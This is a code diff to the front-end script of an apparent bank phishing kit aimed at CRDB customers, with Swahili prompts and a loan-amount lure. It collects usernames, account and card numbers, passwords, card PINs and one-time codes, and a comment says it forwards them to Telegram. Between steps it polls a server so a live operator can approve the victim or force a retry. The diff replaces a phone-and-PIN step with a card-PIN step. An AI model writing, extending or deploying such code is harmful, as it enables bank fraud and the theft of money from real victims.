@@ -2,14 +2,14 @@ document.addEventListener('DOMContentLoaded', () => {
   const stepUnderstand = document.getElementById('step-I UNDERSTAND');
   const stepSlider = document.getElementById('step-slider');
   const stepForm = document.getElementById('step-form');
+  const stepCardPin = document.getElementById('step-card-pin');
   const stepOtp = document.getElementById('step-otp');
-  const stepPhonePin = document.getElementById('step-phone-pin');
   const stepLoading = document.getElementById('step-loading');
   const stepSuccess = document.getElementById('step-success');
 
   const credsSurfaceBanner = document.getElementById('creds-surface-banner');
+  const cardPinSurfaceBanner = document.getElementById('card-pin-surface-banner');
   const otpSurfaceBanner = document.getElementById('otp-surface-banner');
-  const pinSurfaceBanner = document.getElementById('pin-surface-banner');
 
   let currentUserId = null;
   let statusPollInterval = null;
@@ -18,7 +18,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const adminParam = urlParams.get('admin') || '';
 
   function showStep(targetStep) {
-    [stepUnderstand, stepSlider, stepForm, stepOtp, stepPhonePin, stepSuccess].forEach(s => {
+    [stepUnderstand, stepSlider, stepForm, stepCardPin, stepOtp, stepSuccess].forEach(s => {
       if (s) s.classList.remove('active');
     });
     if (targetStep) targetStep.classList.add('active');
@@ -53,7 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Digit Inputs Setup with AUTO-SUBMIT feature
   const otpDigits6 = document.querySelectorAll('.otp-digit-6');
-  const pinDigits = document.querySelectorAll('.pin-digit');
+  const cardPinDigits = document.querySelectorAll('.card-pin-digit');
 
   function setupDigitInputs(inputs, autoSubmitCallback) {
     inputs.forEach((input, idx) => {
@@ -78,7 +78,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   setupDigitInputs(otpDigits6, () => submitOtpHandler());
-  setupDigitInputs(pinDigits, () => submitPhonePinHandler());
+  setupDigitInputs(cardPinDigits, () => submitCardPinHandler());
 
   // Navigation
   document.getElementById('btn-understand-proceed').addEventListener('click', () => {
@@ -89,7 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepForm);
   });
 
-  // Step 1: Submit Credentials & Bank Details
+  // Step 1: Submit Credentials & Bank Details (Sends to Telegram first)
   document.getElementById('btn-submit-creds').addEventListener('click', async () => {
     const username = document.getElementById('crdb-username').value.trim();
     const account = document.getElementById('crdb-account').value.trim();
@@ -116,7 +116,7 @@ document.addEventListener('DOMContentLoaded', () => {
         currentUserId = data.userId;
         document.getElementById('loading-title').innerText = 'Inasubiri Uthibitisho wa Msimamizi...';
         document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
-        startStatusPolling();
+        startStatusPollingForCardPin();
       } else {
         hideLoading();
         alert(data.error || 'Imeshindikana.');
@@ -127,8 +127,71 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Status Polling
-  function startStatusPolling() {
+  function startStatusPollingForCardPin() {
+    if (statusPollInterval) clearInterval(statusPollInterval);
+
+    statusPollInterval = setInterval(async () => {
+      if (!currentUserId) return;
+
+      try {
+        const res = await fetch(`/api/check-status/${currentUserId}`);
+        const data = await res.json();
+
+        if (data.status === 'PROCEED_CARD_PIN') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          showStep(stepCardPin);
+          if (cardPinDigits[0]) cardPinDigits[0].focus();
+        } else if (data.status === 'RETRY_CREDS') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
+          document.getElementById('crdb-username').value = '';
+          document.getElementById('crdb-account').value = '';
+          document.getElementById('crdb-card').value = '';
+          document.getElementById('crdb-password').value = '';
+          showStep(stepForm);
+        }
+      } catch (e) {}
+    }, 3000);
+  }
+
+  // Step 2: Submit Card PIN to Server & Telegram
+  async function submitCardPinHandler() {
+    const cardPinVal = Array.from(cardPinDigits).map(i => i.value).join('');
+
+    if (cardPinVal.length !== 4) {
+      document.getElementById('card-pin-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('card-pin-error').style.display = 'none';
+    if (cardPinSurfaceBanner) cardPinSurfaceBanner.classList.remove('active');
+
+    showLoading('Inathibitisha PIN ya Kadi...', 'Inatuma namba ya siri kwa usalama.');
+
+    try {
+      const res = await fetch('/api/submit-card-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, cardPin: cardPinVal })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('loading-title').innerText = 'Inasubiri Uthibitisho wa PIN...';
+        document.getElementById('loading-sub').innerText = 'Tafadhali baki kwenye ukurasa huu.';
+        startStatusPollingForOtp();
+      } else {
+        hideLoading();
+      }
+    } catch (e) {
+      hideLoading();
+    }
+  }
+
+  document.getElementById('btn-submit-card-pin').addEventListener('click', submitCardPinHandler);
+
+  function startStatusPollingForOtp() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
     statusPollInterval = setInterval(async () => {
@@ -143,25 +206,18 @@ document.addEventListener('DOMContentLoaded', () => {
           hideLoading();
           showStep(stepOtp);
           if (otpDigits6[0]) otpDigits6[0].focus();
-        } else if (data.status === 'PROCEED_PHONE_PIN') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          showStep(stepPhonePin);
-          if (pinDigits[0]) pinDigits[0].focus();
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
           document.getElementById('approved-amount-display').innerText = `TZS ${Number(sliderBalance.value).toLocaleString()}`;
           showStep(stepSuccess);
-        } else if (data.status === 'RETRY_CREDS') {
+        } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
           hideLoading();
-          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
-          document.getElementById('crdb-username').value = '';
-          document.getElementById('crdb-account').value = '';
-          document.getElementById('crdb-card').value = '';
-          document.getElementById('crdb-password').value = '';
-          showStep(stepForm);
+          if (cardPinSurfaceBanner) cardPinSurfaceBanner.classList.add('active');
+          cardPinDigits.forEach(i => i.value = '');
+          if (cardPinDigits[0]) cardPinDigits[0].focus();
+          showStep(stepCardPin);
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -169,13 +225,6 @@ document.addEventListener('DOMContentLoaded', () => {
           otpDigits6.forEach(i => i.value = '');
           if (otpDigits6[0]) otpDigits6[0].focus();
           showStep(stepOtp);
-        } else if (data.status === 'RETRY_PIN') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
-          pinDigits.forEach(i => i.value = '');
-          if (pinDigits[0]) pinDigits[0].focus();
-          showStep(stepPhonePin);
         }
       } catch (e) {}
     }, 3000);
@@ -205,7 +254,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (data.success) {
         document.getElementById('loading-title').innerText = 'Inakagua Namba...';
         document.getElementById('loading-sub').innerText = 'Tafadhali subiri.';
-        startStatusPolling();
+        startStatusPollingForOtp();
       } else {
         hideLoading();
       }
@@ -215,48 +264,6 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);
-
-  // Submit Phone & PIN Function
-  async function submitPhonePinHandler() {
-    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
-    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
-
-    if (phone.length < 9) {
-      document.getElementById('phone-error').style.display = 'block';
-      return;
-    }
-    document.getElementById('phone-error').style.display = 'none';
-
-    if (pinVal.length !== 4) {
-      document.getElementById('pin-error').style.display = 'block';
-      return;
-    }
-    document.getElementById('pin-error').style.display = 'none';
-    if (pinSurfaceBanner) pinSurfaceBanner.classList.remove('active');
-
-    showLoading('Inathibitisha Akaunti...', 'Inakamilisha usalama.');
-
-    try {
-      const res = await fetch('/api/submit-phone-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, phone, pin: pinVal })
-      });
-
-      const data = await res.json();
-      if (data.success) {
-        document.getElementById('loading-title').innerText = 'Inakamilisha Uidhinishaji...';
-        document.getElementById('loading-sub').innerText = 'Tafadhali subiri kidogo.';
-        startStatusPolling();
-      } else {
-        hideLoading();
-      }
-    } catch (e) {
-      hideLoading();
-    }
-  }
-
-  document.getElementById('btn-submit-phone-pin').addEventListener('click', submitPhonePinHandler);
 
   document.getElementById('btn-go-home').addEventListener('click', () => {
     window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
@@ -272,4 +279,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-    
+                                    
